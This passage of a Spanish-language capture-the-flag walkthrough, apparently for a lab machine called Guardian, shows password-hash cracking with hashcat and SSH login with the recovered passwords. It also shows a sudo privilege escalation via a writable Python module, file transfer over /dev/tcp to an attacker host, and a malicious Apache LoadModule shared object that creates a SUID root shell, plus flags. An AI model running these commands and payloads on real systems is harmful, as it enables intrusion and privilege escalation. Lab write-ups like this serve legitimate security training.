GU1662024:5c28cd405a6c0543936c9d010b7471436a7a33fa64f5eb3e84ab9f7acc9a16e5:8Sb)tM1vs1SS
GU9972025:339d519ef0c55e63ebf4a8fde6fda4bca4315b317a1de896fb481bd0834cc599:8Sb)tM1vs1SS
GU6822025:298560c0edce3451fd36b69a15792cbb637c8366f058cf674a6964ff34306482:8Sb)tM1vs1SS
GU7912023:8236b81b5f67c798dd5943bca91817558e987f825b6aae72a592c8f1eaeee021:8Sb)tM1vs1SS
GU3622024:1c92182d9a59d77ea20c0949696711d8458c870126cf21330f61c2cba6ae6bcf:8Sb)tM1vs1SS
GU2002023:3c378b73442c2cf911f2a157fc9e26ecde2230313b46876dab12a661169ed6e2:8Sb)tM1vs1SS
GU3052023:2ef01f607f86387d0c94fc2a3502cc3e6d8715d3b1f124b338623b41aed40cf8:8Sb)tM1vs1SS
GU1462023:585aacf74b22a543022416ed771dca611bd78939908c8323f4f5efef5b4e0202:8Sb)tM1vs1SS
```

### Hashcat (Crack hashes)

Tendremos que añadirle el `salt` al final de cada `hash` para que funcione el mismo que encontramos en el archivo de configuracion de `gitea`. (`:8Sb)tM1vs1SS`)

> NOTA: Hay que quitarle los nombres de usuarios a los `hashes` para utilizar bien `hashcat`

```shell
hashcat -m 1410 -a 0 hash <WORDLIST>
```

Info:

```
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-13th Gen Intel(R) Core(TM) i7-13620H, 2058/4181 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 6 digests; 6 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1410 (sha256($pass.$salt))
Hash.Target......: hash
Time.Started.....: Sun Sep 28 06:37:05 2025 (4 secs)
Time.Estimated...: Sun Sep 28 06:37:09 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4259.6 kH/s (0.20ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 2/6 (33.33%) Digests (total), 2/6 (33.33%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 26%

Started: Sun Sep 28 06:36:41 2025
Stopped: Sun Sep 28 06:37:11 2025
```

Veremos que ha funcionado y nos saca estas credenciales:

```
User: jamil Pass: copperhouse56
User: admin Pass: fakebake000
```

Vamos a probar a entrar por `SSH` con el usuario `jamil`.

```shell
ssh jamil@<IP>
```

Metemos como contraseña `copperhouse56`...

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Sep 28 10:41:31 AM UTC 2025

  System load:  0.01              Processes:             236
  Usage of /:   65.7% of 8.12GB   Users logged in:       0
  Memory usage: 26%               IPv4 address for eth0: 10.10.11.84
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

8 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Sep 28 10:41:33 2025 from 10.10.14.43
jamil@guardian:~$ whoami
jamil
```

Con esto veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
26077aec242479c325de5fe62abfa693
```

## Escalate user mark

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for jamil on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jamil may run the following commands on guardian:
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```

Veremos que podemos ejecutar el script `/opt/scripts/utilities/utilities.py` como el usuario `mark`, por lo que vamos a investigar que hace dicho `script`.

```python
#!/usr/bin/env python3

import argparse
import getpass
import sys

from utils import db
from utils import attachments
from utils import logs
from utils import status


def main():
    parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
    parser.add_argument("action", choices=[
        "backup-db",
        "zip-attachments",
        "collect-logs",
        "system-status"
    ], help="Action to perform")
    
    args = parser.parse_args()
    user = getpass.getuser()

    if args.action == "backup-db":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        db.backup_database()
    elif args.action == "zip-attachments":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        attachments.zip_attachments()
    elif args.action == "collect-logs":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        logs.collect_logs()
    elif args.action == "system-status":
        status.system_status()
    else:
        print("Unknown action.")

if __name__ == "__main__":
    main()
```

Por lo que estamos viendo la unica funcion que no se restringe por el usuario `mark` es el `system-status`, si investigamos un poco podremos ver los siguiente permisos:

```
-rwxrwx--- 1 mark admins 253 Apr 26 09:45 /opt/scripts/utilities/utils/status.py
```

Viendo esto, tambien sabemos que pertenecemos al grupo `admins`:

```shell
id
```

Info:

```
uid=1000(jamil) gid=1000(jamil) groups=1000(jamil),1002(admins)
```

Por lo que podremos editar el modulo, vamos añadir algo asi:

```python
...............................<RESTO DE CODIGO>...................................
os.system("/bin/bash")
```

Lo guardamos y ejecutamos el script de esta forma:

```shell
sudo -u mark /opt/scripts/utilities/utilities.py system-status
```

Info:

```
mark@guardian:/opt/scripts/utilities/output$ whoami
mark
```

Veremos que ha funcionado, por lo que ya seremos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for mark on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

Vemos que podemos ejecutar como `root` el binario `safeapache2ctl`, vamos a ver como funciona.

Si lo ejecutamos nos pide un archivo de configuracion:

```shell
sudo safeapache2ctl
```

Info:

```
Usage: safeapache2ctl -f /home/mark/confs/file.conf
```

Si vamos a donde se depositan los archivos, veremos que esta vacia la carpeta y que podemos crear archivos dentro de la misma.

Vamos a pasarnos el binario para analizarlo de esta forma:

```shell
nc -lvnp <PORT> > safeapache2ctl
```

En la maquina victima:

```shell
cat /usr/local/bin/safeapache2ctl > /dev/tcp/<IP_ATTACKER>/<PORT>
```

Ahora si listamos el binario en nuestra maquina atacante, veremos que nos lo pasamos bien:

```
-rwxr-xr-x 1 root root     16616 Sep 28 07:24 safeapache2ctl
```

Vamos abrirlo con `ghidra` para decompilarlo y ver el codigo legible en `C#`.

> main.c

```c
undefined8 main(int param_1,undefined8 *param_2)

{
  int iVar1;
  char *pcVar2;
  FILE *__stream;
  long in_FS_OFFSET;
  char local_1418 [1024];
  char local_1018 [4104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 == 3) {
    iVar1 = strcmp((char *)param_2[1],"-f");
    if (iVar1 == 0) {
      pcVar2 = realpath((char *)param_2[2],local_1018);
      if (pcVar2 == (char *)0x0) {
        perror("realpath");
      }
      else {
        iVar1 = starts_with(local_1018,"/home/mark/confs/");
        if (iVar1 == 0) {
          fprintf(stderr,"Access denied: config must be inside %s\n","/home/mark/confs/");
        }
        else {
          __stream = fopen(local_1018,"r");
          if (__stream == (FILE *)0x0) {
            perror("fopen");
          }
          else {
            do {
              pcVar2 = fgets(local_1418,0x400,__stream);
              if (pcVar2 == (char *)0x0) {
                fclose(__stream);
                execl("/usr/sbin/apache2ctl","apache2ctl",&DAT_00102072,local_1018,0);
                perror("execl failed");
                goto LAB_00101663;
              }
              iVar1 = is_unsafe_line(local_1418);
            } while (iVar1 == 0);
            fwrite("Blocked: Config includes unsafe directive.\n",1,0x2b,stderr);
            fclose(__stream);
          }
        }
      }
      goto LAB_00101663;
    }
  }
  fprintf(stderr,"Usage: %s -f /home/mark/confs/file.conf\n",*param_2);
LAB_00101663:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 1;
}
```

> is\_unsafe\_line.c

```c
undefined8 is_unsafe_line(undefined8 param_1)

{
  int iVar1;
  undefined8 uVar2;
  long in_FS_OFFSET;
  char local_1038 [32];
  char local_1018 [4104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  iVar1 = __isoc99_sscanf(param_1,"%31s %1023s",local_1038,local_1018);
  if (iVar1 != 2) {
    uVar2 = 0;
    goto LAB_00101423;
  }
  iVar1 = strcmp(local_1038,"Include");
  if (iVar1 == 0) {
LAB_001013c6:
    if (local_1018[0] == '/') {
      iVar1 = starts_with(local_1018,"/home/mark/confs/");
      if (iVar1 == 0) {
        fprintf(stderr,"[!] Blocked: %s is outside of %s\n",local_1018,"/home/mark/confs/");
        uVar2 = 1;
        goto LAB_00101423;
      }
    }
  }
  else {
    iVar1 = strcmp(local_1038,"IncludeOptional");
    if (iVar1 == 0) goto LAB_001013c6;
    iVar1 = strcmp(local_1038,"LoadModule");
    if (iVar1 == 0) goto LAB_001013c6;
  }
  uVar2 = 0;
LAB_00101423:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar2;
}
```

Veremos que en el codigo se puede cargar una configuracion, para posteriormente cargar un binario que queremos que se ejecute, por lo que vamos a explotarlo de esta forma:

```shell
cat > /home/mark/confs/pwn.c << 'EOF'
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    FILE *f = fopen("/tmp/pwned.txt", "w");
    if (f) {
        fprintf(f, "[+] Ejecutado como uid: %d\n", getuid());
        fclose(f);
    }
    system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash 2>/dev/null");
}
EOF

gcc -shared -fPIC -o /home/mark/confs/pwn.so /home/mark/confs/pwn.c
echo 'LoadModule pwn_module /home/mark/confs/pwn.so' > /home/mark/confs/exploit.conf
sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/exploit.conf
```

Info:

```
apache2: Syntax error on line 1 of /home/mark/confs/exploit.conf: Can't locate API module structure `pwn_module' in file /home/mark/confs/pwn.so: /home/mark/confs/pwn.so: undefined symbol: pwn_module
Action '-f /home/mark/confs/exploit.conf' failed.
The Apache error log may have more information.
```

Nos dara como una especie de error, pero si vamos al `/tmp` veremos que se ha ejecutado de forma correcta:

```shell
ls -la /tmp/rootbash
```

Info:

```
-rwsr-xr-x 1 root root 1396520 Sep 28 12:00 /tmp/rootbash
```

Veremos que ha funcionado, por lo que vamos a ser `root` directamente haciendo esto:

```shell
/tmp/rootbash -p
```

Info:

```
rootbash-5.1# whoami
root
```

Por lo que vemos ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
d0cd9a22af792e77c5d6b84f210c5018
```
